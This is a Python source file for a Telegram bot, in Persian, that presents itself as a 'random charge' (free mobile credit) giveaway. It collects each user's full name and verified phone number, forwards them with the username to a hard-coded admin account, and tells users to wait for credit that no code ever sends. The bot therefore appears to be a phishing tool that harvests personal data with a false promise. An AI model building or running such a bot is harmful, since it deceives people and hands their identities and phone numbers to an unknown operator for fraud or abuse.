import os
import random
import logging
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# =============== غیرفعال کردن لاگ‌های اضافی ===============
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)
logging.basicConfig(level=logging.ERROR)

# =============== گرفتن توکن از محیط ===============
TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TOKEN:
    raise ValueError("TELEGRAM_TOKEN environment variable not set!")

# آیدی عددی خودت (ادمین)
YOUR_ADMIN_ID = 7830578378  # با آیدی خودت جایگزین کن

# مراحل مکالمه
FULLNAME, PHONE = range(2)

# دیکشنری ذخیره اطلاعات
user_data = {}

# =============== فلاسک اپ ===============
app = Flask(__name__)

@app.route('/')
def home():
    return "ربات روشنه! ✅", 200

@app.route('/health')
def health():
    return "OK", 200

# =============== توابع ربات ===============
def print_user_info(user_info, user_id):
    print("\n" + "="*55)
    print("🔔 کاربر جدید ثبت نام کرد!")
    print("="*55)
    print(f"👤 نام و نام خانوادگی: {user_info.get('fullname', 'نامشخص')}")
    print(f"📱 شماره تلفن: {user_info.get('phone', 'ندارد')}")
    print(f"🆔 آیدی عددی: {user_id}")
    print(f"🆔 یوزرنیم: @{user_info.get('username', 'ندارد')}")
    print(f"📅 تاریخ ثبت: {user_info.get('date', 'نامشخص')}")
    print("="*55 + "\n")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    await update.message.reply_text(
        f"👋 سلام {user.first_name}!\n\n"
        "به ربات شارژ رندوم خوش آمدید!\n"
        "لطفاً **نام و نام خانوادگی** خود را با هم وارد کنید:\n"
        "مثال: `علی رضایی`",
        parse_mode='Markdown'
    )
    return FULLNAME

async def get_fullname(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    user_data[user_id] = {}
    user_data[user_id]['fullname'] = update.message.text.strip()
    
    keyboard = [[KeyboardButton("📱 ارسال شماره تلفن", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "✅ ثبت شد!\n\n"
        "📱 لطفاً شماره تلفن خود را **فقط با کلیک روی دکمه زیر** ارسال کنید:",
        reply_markup=reply_markup
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    contact = update.message.contact
    
    if contact and contact.user_id == user_id:
        user_data[user_id]['phone'] = contact.phone_number
        user_data[user_id]['username'] = update.effective_user.username or "ندارد"
        user_data[user_id]['date'] = str(update.message.date)
        
        print_user_info(user_data[user_id], user_id)
        
        await update.message.reply_text(
            "✅ اطلاعات شما با موفقیت ثبت شد!\n\n"
            "🔄 منتظر بمانید تا شارژ برای شما ارسال شود...",
            reply_markup=ReplyKeyboardRemove()
        )
        
        try:
            admin_text = (
                "🔔 کاربر جدید\n\n"
                f"👤 {user_data[user_id]['fullname']}\n"
                f"📱 {user_data[user_id]['phone']}\n"
                f"🆔 @{user_data[user_id]['username']}"
            )
            await context.bot.send_message(chat_id=YOUR_ADMIN_ID, text=admin_text)
        except:
            pass
        
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "❌ شماره تلفن باید فقط از طریق دکمه ارسال شود!"
        )
        return PHONE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "❌ عملیات لغو شد.\nبرای شروع مجدد /start را بزنید.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

# =============== تابع اجرای ربات ===============
def run_bot():
    """اجرای ربات در main thread"""
    application = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            FULLNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_fullname)],
            PHONE: [MessageHandler(filters.ALL, get_phone)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    application.add_handler(conv_handler)
    
    print("\n" + "="*55)
    print("🤖 ربات شارژ رندوم روشن شد!")
    print("📡 منتظر ثبت‌نام کاربران هستم...")
    print("="*55 + "\n")
    
    # این تابع تا زمانی که متوقف نشود، اجرا می‌شود
    application.run_polling(allowed_updates=Update.ALL_TYPES)
